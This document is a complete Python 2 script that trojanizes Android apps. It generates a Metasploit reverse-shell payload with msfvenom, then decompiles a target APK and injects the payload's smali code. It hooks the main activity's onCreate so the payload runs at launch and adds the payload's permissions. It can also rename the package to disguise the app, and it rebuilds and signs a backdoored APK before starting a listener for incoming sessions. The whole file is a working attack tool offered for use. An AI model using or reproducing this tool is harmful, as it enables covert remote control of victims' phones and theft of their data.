import argparse
import time
import os
import sys
import re


def init():
	payloads = [
		'meterpreter_reverse_http',
		'meterpreter_reverse_https',
		'meterpreter_reverse_tcp',
		'shell_reverse_http',
		'shell_reverse_https',
		'shell_reverse_tcp']
	try:
		args = argparse.ArgumentParser(epilog='Usage example: apkvenom.py -a file.apk -p meterpreter_reverse_tcp -lh 192.168.1.2 -lp 4444 -r com.renamed.package')
		args.add_argument('-a', '--apk', help='Target APK path')
		args.add_argument('-p', '--payload', help='Payload to use. Allowed values: ' + ', '.join(payloads))
		args.add_argument('-lh', '--host', help='msf handler listening host')
		args.add_argument('-lp', '--port', help='msf handler listening port')
		args.add_argument('-r', '--rename-package', help='Rename app package_name')
		global pargs
		pargs = args.parse_args()
		if not pargs.apk:
			pargs.apk = raw_input('APK path: ')
		if not pargs.payload:
			print('[+] Available payloads:')
			for p in payloads:
				print('	[*] %s' % (p))
			pargs.payload = raw_input('payload: ')
			if pargs.payload == '':
				pargs.payload = 'meterpreter_reverse_tcp'
		if not pargs.host:
			pargs.host = raw_input('listening host: ')
		if not pargs.port:
			pargs.port = raw_input('listening port: ')

		if (not os.path.isfile(pargs.apk)) or (not os.access(pargs.apk, os.R_OK)):
			print("APK reading error")
			sys.exit()

		if not pargs.payload in payloads:
			print('payload no exists')
			sys.exit()
			
		if not pargs.port.isdigit():
			print('port error')
			sys.exit()
			
	except Exception, e:
		print(e)

def payload_gen():
	print('[+] Generating payload')
	os.system('msfvenom -p %s LHOST=%s LPORT=%s -o venom.apk' % ('android/'+pargs.payload.replace('_','/',1), pargs.host, pargs.port))

def payload_inject():
	print('[+] Decompiling target APK')
	os.system('java -jar apktool.jar d -f %s' % pargs.apk)
	print('[+] Decompiling payload APK')
	os.system('java -jar apktool.jar d -f venom.apk')
	print('[+] Injecting payload')
	apk_name = os.path.splitext(pargs.apk)[0]
	apk_manifest = '%s/AndroidManifest.xml' % apk_name
	path = '%s/smali/com/metasploit' % apk_name
	if not os.path.exists(path):
		os.makedirs(path)
	path = '%s/smali/com/metasploit/stage' % apk_name
	if not os.path.exists(path):
		os.makedirs(path)
	os.system('cp venom/smali/com/metasploit/stage/Payload* %s/smali/com/metasploit/stage' % apk_name)
	fread = open(apk_manifest, 'r').read()
	fread = fread.split('<action android:name="android.intent.action.MAIN"/>')[0].split('<activity android:')[1]
	acn = re.search('android:name=\"[\w.]+',fread)
	activity_path = acn.group(0).split('"')[1].replace('.','/') + ".smali"
	print(activity_path)
	fread = open('%s/smali/%s' %(apk_name, activity_path), 'r').read()
	print('[+] Hooking')
	first = fread.split(';->onCreate(Landroid/os/Bundle;)V')[0]
	second = fread.split(';->onCreate(Landroid/os/Bundle;)V')[1]
	payload_injection = ';->onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'
	file = open('%s/smali/%s' %(apk_name, activity_path), 'w')
	file.write(first + payload_injection + second)
	file.close()
	print('[+] Hooked :)')
	
def add_permissions():
	print('[+] Adding permissions')
	apk_name = os.path.splitext(pargs.apk)[0]
	venom_manifest = 'venom/AndroidManifest.xml'
	fread = open(venom_manifest, 'r').readlines()
	permission_list = []
	for l in fread:
		if('<uses-permission' in l):
			permission_list.append(l.replace('\n',''))
	apk_manifest = '%s/AndroidManifest.xml' % apk_name
	fread = open(apk_manifest,'r').readlines()
	half = []
	for l in fread:
		if('<uses-permission' in l):
			permission_list.append(l.replace('\n',''))
		else:
			half.append(l)
	file = open(apk_manifest, 'w')
	for p in half:
		if half.index(p)==2:
			for j in permission_list:
				file.write(j+'\n')
		else:
			file.write(p)
	for p in permission_list:
		print '\t',p.split('android:name="')[1].split('"')[0]
		
	print('[+] Permissions added')
	
def renamePackage():
	print('[+] Renaming package')
	apk_name = os.path.splitext(pargs.apk)[0]
	apk_manifest = '%s/AndroidManifest.xml' % apk_name
	fread = open(apk_manifest, 'r').read()
	
	old_package = re.findall('package="([^\s]+)"', fread)[0]
	old_package_smali = old_package.replace('.', '/')
	print('Old package_name: %s' % old_package)
	new_package = pargs.rename_package
	print('New package_name: %s' % new_package)
	new_package_smali = new_package.replace('.', '/')
	
	# Lets do stuff
	root = os.path.splitext(pargs.apk)[0]
	find = old_package
	replace = new_package
	
	for root, folder, files in os.walk(root):
		for file in files:
			path = os.path.join(root, file)
			try:
				f = open(path, 'r')
				r = f.read()
				f.close()
				
				f = open(path, 'w')
				r = r.replace(find, replace)
				f.write(r)
				f.close()
			except Exception, ex:
				print ex
def buildAPK():
	print('[+] Building backdoored APK')
	apk_name = os.path.splitext(pargs.apk)[0]
	os.system('java -jar apktool.jar b -f %s' % apk_name)
	path = '%s/dist/%s' % (apk_name,pargs.apk)
	os.system('java -jar signapk.jar certificate.pem key.pk8 %s %s-backdoor.apk' % (path, pargs.apk[:-4]))
	print('DONE')
	
def msfhandler():
	q = raw_input('Setup msf listener? [Y/n]').lower()
	if(q=='y') or (q==''):
		msfrc = open('msf.rc', 'w')
		msfrc.write('use exploit/multi/handler\n')
		msfrc.write('set PAYLOAD %s\n' % ('android/'+pargs.payload.replace('_','/',1)))
		msfrc.write('set LHOST %s\n' % pargs.host)
		msfrc.write('set LPORT %s\n' % pargs.port)
		msfrc.write('set ExitOnSession false\n')
		msfrc.write('exploit -j\n')
		msfrc.close()
		os.system('msfconsole -qr msf.rc')
		
def clean():
	os.system('rm -rf venom venom.apk %s' % (pargs.apk.split('.')[0]))
	
if __name__ == '__main__':
	try:
		print("[*] Starting at %s" % (time.strftime('%X')))
		init()
		payload_gen()
		payload_inject()
		add_permissions()
		buildAPK()
		if pargs.rename_package is not None: renamePackage()
		clean()
		msfhandler()
		
	except Exception, e:
		print(e)